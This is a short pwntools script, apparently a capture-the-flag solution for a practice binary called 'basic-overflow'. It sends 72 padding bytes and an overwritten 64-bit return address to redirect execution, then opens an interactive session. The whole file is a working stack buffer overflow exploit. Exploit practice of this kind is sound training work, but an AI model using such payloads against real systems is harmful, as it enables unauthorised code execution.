from pwn import *

io = process("./basic-overflow")
# io = gdb.debug("./basic-overflow", '''
# b *0x0000000000401175
# c
# ''')
context.log_level = 'debug'
payload = b'a' * 72
payload += p64(0x0000000000401136)
io.sendline(payload)
io.interactive()

